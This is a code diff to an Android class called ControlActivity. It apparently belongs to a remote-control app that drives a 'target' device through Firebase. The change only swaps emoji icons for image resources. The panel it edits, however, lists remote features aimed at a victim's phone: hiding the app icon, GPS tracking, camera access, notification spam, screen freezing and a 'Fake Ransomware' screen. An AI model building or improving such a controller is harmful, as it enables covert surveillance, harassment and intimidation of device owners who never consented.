@@ -6,6 +6,7 @@ import android.os.Handler;
 import android.view.View;
 import android.widget.Button;
 import android.widget.GridLayout;
+import android.widget.ImageView;
 import android.widget.Switch;
 import android.widget.TextView;
 import android.widget.Toast;
@@ -20,7 +21,6 @@ public class ControlActivity extends AppCompatActivity {
     private GridLayout gridFitur;
     private Button btnBack;
     private String targetId;
-    private String targetName;
     private Handler handler = new Handler();
 
     @Override
@@ -32,7 +32,6 @@ public class ControlActivity extends AppCompatActivity {
         btnBack = findViewById(R.id.btnBack);
 
         targetId = getIntent().getStringExtra("targetId");
-        targetName = getIntent().getStringExtra("targetName");
 
         FirebaseDatabase database = FirebaseDatabase.getInstance();
         mDatabase = database.getReference("target").child(targetId);
@@ -54,7 +53,12 @@ public class ControlActivity extends AppCompatActivity {
             "Video Overlay", "Hide Icon", "Spam Notifikasi", "Stuck Layar",
             "GPS", "Kamera", "Fake Ransomware", "Ngehang"
         };
-        String[] fiturIcons = {"🔦", "🔒", "🔒", "🎨", "🎬", "👻", "📨", "🔒", "📍", "📸", "💰", "💀"};
+        int[] fiturIcons = {
+            R.drawable.ic_flashlight, R.drawable.ic_lock, R.drawable.ic_lock,
+            R.drawable.ic_palette, R.drawable.ic_video, R.drawable.ic_hide,
+            R.drawable.ic_spam, R.drawable.ic_stuck, R.drawable.ic_gps,
+            R.drawable.ic_camera, R.drawable.ic_ransom, R.drawable.ic_ngehang
+        };
         boolean[] isToggle = {true, true, true, false, false, true, false, false, false, false, false, true};
 
         gridFitur.removeAllViews();
@@ -62,13 +66,13 @@ public class ControlActivity extends AppCompatActivity {
         for (int i = 0; i < fiturNames.length; i++) {
             View card = getLayoutInflater().inflate(R.layout.card_fitur_premium, null);
 
-            TextView icon = card.findViewById(R.id.ivIcon);
+            ImageView icon = card.findViewById(R.id.ivIcon);
             TextView nama = card.findViewById(R.id.tvNamaFitur);
             TextView status = card.findViewById(R.id.tvStatusFitur);
             Switch sw = card.findViewById(R.id.swFitur);
             Button btnAction = card.findViewById(R.id.btnAction);
 
-            icon.setText(fiturIcons[i]);
+            icon.setImageResource(fiturIcons[i]);
             nama.setText(fiturNames[i]);
 
             if (isToggle[i]) {
@@ -119,4 +123,4 @@ public class ControlActivity extends AppCompatActivity {
     private void showSnackbar(String message) {
         Snackbar.make(findViewById(android.R.id.content), message, Snackbar.LENGTH_SHORT).show();
     }
-}
+                        }
